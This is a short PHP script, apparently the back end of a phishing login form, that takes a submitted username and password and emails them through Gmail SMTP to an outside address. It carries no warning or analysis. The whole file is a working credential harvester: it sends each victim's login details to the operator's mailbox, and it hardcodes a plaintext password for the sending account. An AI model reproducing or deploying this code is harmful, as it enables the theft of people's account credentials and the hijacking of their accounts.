<?php
require_once "login.php";

$un = $_POST['demo-name'];
$pw = $_POST['demo-pwd'];

$from = '<teamstalky818@gmail.com>';
$to = '<johnhales818@gmail.com>';
$subject = 'Stalky';
$body = "Hi,\n\n$un is $pw.";

$headers = array(
    'From' => $from,
    'To' => $to,
    'Subject' => $subject
);

$smtp = Mail::factory('smtp', array(
        'host' => 'ssl://smtp.gmail.com',
        'port' => '465',
        'auth' => true,
        'username' => 'teamstalky818@gmail.com',
        'password' => 'hackinglikepro'
    ));

$mail = $smtp->send($to, $headers, $body);

if (PEAR::isError($mail)) {
    header('Location : error.html', true, 301);
	exit();
} else {
    echo('<p>Message successfully sent!</p>');
}
?>